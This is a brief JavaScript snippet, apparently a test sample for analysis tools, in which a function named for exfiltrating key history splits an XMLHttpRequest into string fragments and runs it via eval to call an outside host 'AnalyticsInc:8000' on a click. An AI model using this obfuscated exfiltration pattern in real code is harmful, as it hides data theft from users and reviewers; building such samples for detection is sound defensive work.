function exfiltrate_key_history() {

    // Eval with Concat
    // Exfiltrate data using XMLHTTP request
    var a='xmlhttp=new XMLHt';
    var b='tpRequest();';
    var c='xmlhttp.op';
    var d='en("GET", "http://AnalyticsInc:8000/submission.html?test=concat", true);';
    var e='xmlhttp.se';
    var f='nd(null);';
    eval(a+b+c+d+e+f);
	
}

document.getElementById('test').onclick = exfiltrate_key_history;
